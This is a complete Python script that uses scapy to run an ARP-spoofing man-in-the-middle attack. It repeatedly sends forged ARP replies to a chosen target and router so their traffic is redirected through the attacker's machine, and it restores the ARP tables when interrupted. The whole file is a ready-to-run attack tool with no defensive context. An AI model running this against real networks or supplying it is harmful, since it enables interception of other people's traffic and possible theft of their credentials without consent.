#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_argument():
    parser = argparse.ArgumentParser(description="User Input for range of IP")
    parser.add_argument("-t", "--target", dest="target", help="Enter Target IP for spoofing")
    parser.add_argument("-r", "--router", dest="router", help="Enter Router IP for spoofing")
    options = parser.parse_args()
    if not options:
        print("[-] Please enter Target and Router IP address.")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_argument()
target = options.target
router = options.router
packets_sent = 0
try:

    while True:
        spoof(target, router)
        spoof(router, target)
        packets_sent += 2
        print("\r[+] Packets Sent: " + str(packets_sent), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detect CTRL + C ....Resetting ARP tables.....Quiting.")
    restore(target, router)
    restore(router, target)
    print("[+] ARP tables restored.")